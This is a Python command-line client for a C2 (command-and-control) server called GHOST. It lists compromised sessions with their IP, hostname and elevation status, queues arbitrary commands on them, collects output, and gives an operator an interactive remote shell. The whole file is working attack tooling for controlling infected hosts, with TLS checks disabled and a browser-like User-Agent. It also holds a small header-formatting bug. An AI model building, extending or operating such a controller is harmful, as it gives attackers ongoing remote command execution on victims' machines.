"""
GHOST Operator CLI – Fully Interactive with Session Picker
"""
import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import quote

try:
    import requests
    import urllib3
except ImportError:
    sys.exit("[!] Missing dependency. Run: pip install requests urllib3")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# ANSI colour helpers
# ---------------------------------------------------------------------------

RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
GREY    = "\033[90m"
MAGENTA = "\033[95m"
WHITE   = "\033[97m"

def _supports_color() -> bool:
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

def c(text: str, color: str) -> str:
    return f"{color}{text}{RESET}" if _supports_color() else text

def ok(msg: str)   -> None: print(c(f"[+] {msg}", GREEN))
def err(msg: str)  -> None: print(c(f"[!] {msg}", RED), file=sys.stderr)
def info(msg: str) -> None: print(c(f"[*] {msg}", CYAN))
def warn(msg: str) -> None: print(c(f"[-] {msg}", YELLOW))

# ---------------------------------------------------------------------------
# Human‑readable relative time
# ---------------------------------------------------------------------------

def human_time_ago(iso_time: str) -> str:
    try:
        dt = datetime.fromisoformat(iso_time)
    except Exception:
        return iso_time[:19]
    now = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    diff = (now - dt).total_seconds()
    if diff < 60:
        return f"{int(diff)}s ago"
    elif diff < 3600:
        mins = int(diff // 60)
        return f"{mins}m ago"
    elif diff < 86400:
        hrs = int(diff // 3600)
        return f"{hrs}h ago"
    else:
        days = int(diff // 86400)
        return f"{days}d ago"

def time_color(iso_time: str) -> str:
    try:
        dt = datetime.fromisoformat(iso_time)
    except Exception:
        return GREY
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    diff = (now - dt).total_seconds()
    if diff < 60:
        return GREEN
    elif diff < 300:
        return YELLOW
    else:
        return RED

# ---------------------------------------------------------------------------
# Client – handles URL encoding
# ---------------------------------------------------------------------------

class GhostClient:
    def __init__(self, base_url: str, operator_token: str, verify_ssl: bool = False) -> None:
        self.base_url = base_url.rstrip("/")
        self.session  = requests.Session()
        self.session.verify = verify_ssl
        self.session.headers.update({
            "X-Operator-Token": operator_token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
        })

    def _get(self, path: str, params: Optional[dict] = None) -> dict:
        resp = self.session.get(f"{self.base_url}{path}", params=params, timeout=10)
        resp.raise_for_status()
        return resp.json()

    def _post(self, path: str, payload: dict) -> dict:
        resp = self.session.post(f"{self.base_url}{path}", json=payload, timeout=10)
        resp.raise_for_status()
        return resp.json()

    def _delete(self, path: str) -> dict:
        resp = self.session.delete(f"{self.base_url}{path}", timeout=10)
        resp.raise_for_status()
        return resp.json()

    def list_sessions(self) -> list:
        return self._get("/sessions")

    def task(self, sid: str, cmd: str) -> dict:
        return self._post("/task", {"session": sid, "cmd": cmd})

    def results(self, sid: str, clear: bool = False) -> dict:
        params = {"clear": "1"} if clear else {}
        encoded_sid = quote(sid, safe="")
        return self._get(f"/results/{encoded_sid}", params=params)

    def clear_results(self, sid: str) -> dict:
        encoded_sid = quote(sid, safe="")
        return self._get(f"/results/{encoded_sid}", params={"clear": "1"})

    def kill(self, sid: str) -> dict:
        encoded_sid = quote(sid, safe="")
        return self._delete(f"/sessions/{encoded_sid}")

    def audit(self, limit: int = 50) -> dict:
        return self._get("/audit", params={"limit": limit})

# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------

def _idle_label(idle_sec: float) -> str:
    if idle_sec < 60:
        color = GREEN
    elif idle_sec < 300:
        color = YELLOW
    else:
        color = RED
    return c(f"{idle_sec:.0f}s", color)

def print_sessions(sessions: list, numbered: bool = False) -> None:
    if not sessions:
        warn("No active sessions.")
        return

    col_w = [36, 16, 20, 10, 12, 7, 8]
    header = (
        f"{'#':<4}" if numbered else ""
        f"{'SESSION ID':<{col_w[0]}} "
        f"{'REMOTE IP':<{col_w[1]}} "
        f"{'LAST SEEN':<{col_w[2]}} "
        f"{'IDLE':<{col_w[3]}} "
        f"{'HOSTNAME':<{col_w[4]}} "
        f"{'ELEV':<{col_w[5]}} "
        f"{'TASKS':<{col_w[6]}}"
    )
    print()
    print(c(header, BOLD + CYAN))
    print(c("-" * (sum(col_w) + len(col_w) - 1 + (4 if numbered else 0)), GREY))

    for idx, s in enumerate(sessions, start=1):
        last_beacon = s.get("last_beacon", "")
        rel_time = human_time_ago(last_beacon)
        rel_col = time_color(last_beacon)
        last_seen_str = c(rel_time, rel_col)

        recon    = s.get("recon", {})
        hostname = recon.get("hostname", "?")[:10]
        elevated = c("YES", RED) if recon.get("elevated") else c("no", GREY)
        idle     = _idle_label(s.get("idle_seconds", 0))
        tasks    = str(s.get("pending_tasks", 0))
        sid      = s["session"][:36]
        ip       = s.get("remote_ip", "?")[:16]

        prefix = f"{c(str(idx), MAGENTA):<4}" if numbered else ""
        print(
            f"{prefix}"
            f"{c(sid, MAGENTA):<{col_w[0]}} "
            f"{ip:<{col_w[1]}} "
            f"{last_seen_str:<{col_w[2]}} "
            f"{idle:<{col_w[3]}} "
            f"{hostname:<{col_w[4]}} "
            f"{elevated:<{col_w[5]}} "
            f"{tasks:<{col_w[6]}}"
        )
    print()

def print_results(data: dict) -> None:
    results = data.get("results", [])
    sid     = data.get("session", "?")

    if not results:
        warn(f"No results for session {sid}")
        return

    print()
    for entry in results:
        if isinstance(entry, dict):
            ts  = entry.get("ts", "")
            out = entry.get("output", "")
        else:
            ts  = ""
            out = str(entry)

        if ts:
            print(c(f"── {ts} ──", GREY))
        print(out)
        print()

def print_audit(data: dict) -> None:
    entries = data.get("entries", [])
    if not entries:
        warn("Audit log is empty.")
        return

    print()
    for e in entries:
        ts     = e.get("ts", "")[:19]
        action = e.get("action", "?")
        ip     = e.get("ip", "?")
        rest   = {k: v for k, v in e.items() if k not in ("ts", "action", "ip")}
        detail = json.dumps(rest, separators=(",", ":")) if rest else ""
        print(f"{c(ts, GREY)}  {c(action, CYAN):<28}  {c(ip, YELLOW)}  {detail}")
    print()

# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

def cmd_sessions(client: GhostClient, _args) -> None:
    data = client.list_sessions()
    print_sessions(data, numbered=False)

def cmd_task(client: GhostClient, args) -> None:
    resp = client.task(args.sid, args.cmd)
    ok(f"Queued on {args.sid} | depth={resp.get('queue_depth', '?')}")

def cmd_results(client: GhostClient, args) -> None:
    clear = getattr(args, "clear", False)
    data = client.results(args.sid, clear=clear)
    print_results(data)

def cmd_kill(client: GhostClient, args) -> None:
    resp = client.kill(args.sid)
    ok(f"Exit queued for {args.sid} — {resp.get('status', '')}")

def cmd_audit(client: GhostClient, args) -> None:
    limit = getattr(args, "limit", 50)
    data  = client.audit(limit=limit)
    print_audit(data)

def cmd_shell(client: GhostClient, args) -> None:
    sid = args.sid
    info(f"Entering shell mode for session {c(sid, MAGENTA)}")
    info("Type 'bg' to background (keep session), 'exit' to kill session.")
    print()

    while True:
        try:
            raw = input(c(f"ghost({sid[:8]})> ", BOLD + GREEN))
        except (EOFError, KeyboardInterrupt):
            print()
            warn("Backgrounding session (not killed).")
            break

        cmd = raw.strip()
        if not cmd:
            continue
        if cmd.lower() == "bg":
            warn("Backgrounding session (not killed).")
            break
        if cmd.lower() == "exit":
            client.kill(sid)
            ok("Session killed.")
            break

        try:
            client.task(sid, cmd)
        except requests.HTTPError as e:
            err(f"Failed to queue task: {e}")
            continue

        info("Waiting for result...")
        deadline = time.time() + 60
        got_result = False
        while time.time() < deadline:
            time.sleep(2)
            try:
                data = client.results(sid, clear=True)
                if data.get("results"):
                    print_results(data)
                    got_result = True
                    break
            except requests.HTTPError as e:
                if e.response.status_code == 404:
                    err("Session not found – it may have expired.")
                    return
                pass

        if not got_result:
            warn("Timed out waiting for result (task still queued).")

def cmd_console(client: GhostClient, _args) -> None:
    """
    Interactive session picker:
    - Lists all active sessions with numbers.
    - User selects a number → drops into shell for that session.
    """
    info("Fetching sessions...")
    sessions = client.list_sessions()
    if not sessions:
        warn("No active sessions.")
        return

    print_sessions(sessions, numbered=True)

    while True:
        try:
            choice = input(c("Select session number (or 'q' to quit): ", BOLD + CYAN)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            warn("Exiting.")
            return

        if choice.lower() in ("q", "quit", "exit"):
            info("Goodbye.")
            return

        if not choice.isdigit():
            warn("Invalid input – enter a number.")
            continue

        idx = int(choice) - 1
        if idx < 0 or idx >= len(sessions):
            warn(f"Invalid number – choose 1–{len(sessions)}")
            continue

        sid = sessions[idx]["session"]
        info(f"Connecting to session {c(sid, MAGENTA)}...")
        # Re‑enter shell mode with this session
        # We'll reuse the shell logic by creating a mock args object
        class MockArgs:
            pass
        shell_args = MockArgs()
        shell_args.sid = sid
        cmd_shell(client, shell_args)
        # After shell exits, loop back to session list
        info("Returning to session list.")
        # Refresh list
        sessions = client.list_sessions()
        if not sessions:
            warn("No active sessions left.")
            return
        print_sessions(sessions, numbered=True)

# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="c2_cli",
        description="GHOST C2 Operator CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--url",   default=os.environ.get("GHOST_C2_URL", "https://127.0.0.1"),
                   help="C2 server base URL (default: https://127.0.0.1)")
    p.add_argument("--token", default=os.environ.get("GHOST_OPERATOR_TOKEN", ""),
                   help="Operator token (or set GHOST_OPERATOR_TOKEN env var)")
    p.add_argument("--ssl-verify", action="store_true", default=False,
                   help="Verify TLS certificate (off by default for self-signed)")

    sub = p.add_subparsers(dest="command", metavar="COMMAND")

    sub.add_parser("sessions", help="List active sessions")

    t = sub.add_parser("task", help="Queue a command on a session")
    t.add_argument("sid", help="Session ID")
    t.add_argument("cmd", help="Command string to execute")

    r = sub.add_parser("results", help="Retrieve results for a session")
    r.add_argument("sid", help="Session ID")
    r.add_argument("--clear", action="store_true", help="Clear results after retrieval")

    k = sub.add_parser("kill", help="Queue exit and remove session")
    k.add_argument("sid", help="Session ID")

    a = sub.add_parser("audit", help="View operator audit log")
    a.add_argument("--limit", type=int, default=50, help="Max entries to show (default: 50)")

    sh = sub.add_parser("shell", help="Interactive shell mode for a session")
    sh.add_argument("sid", help="Session ID")

    # New interactive console command
    sub.add_parser("console", help="Interactive session picker – list sessions, choose by number, get shell")

    return p

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

COMMAND_MAP = {
    "sessions": cmd_sessions,
    "task":     cmd_task,
    "results":  cmd_results,
    "kill":     cmd_kill,
    "audit":    cmd_audit,
    "shell":    cmd_shell,
    "console":  cmd_console,
}

def main() -> None:
    parser = build_parser()
    args   = parser.parse_args()

    if not args.command:
        # If no command, default to 'console' (interactive picker)
        args.command = "console"

    if not args.token:
        err("No operator token. Set --token or GHOST_OPERATOR_TOKEN env var.")
        sys.exit(1)

    client = GhostClient(args.url, args.token, verify_ssl=args.ssl_verify)

    handler = COMMAND_MAP.get(args.command)
    if not handler:
        err(f"Unknown command: {args.command}")
        sys.exit(1)

    try:
        handler(client, args)
    except requests.exceptions.ConnectionError:
        err(f"Cannot connect to {args.url}")
        sys.exit(1)
    except requests.exceptions.HTTPError as e:
        err(f"HTTP {e.response.status_code}: {e.response.text[:200]}")
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        sys.exit(0)

if __name__ == "__main__":
    main()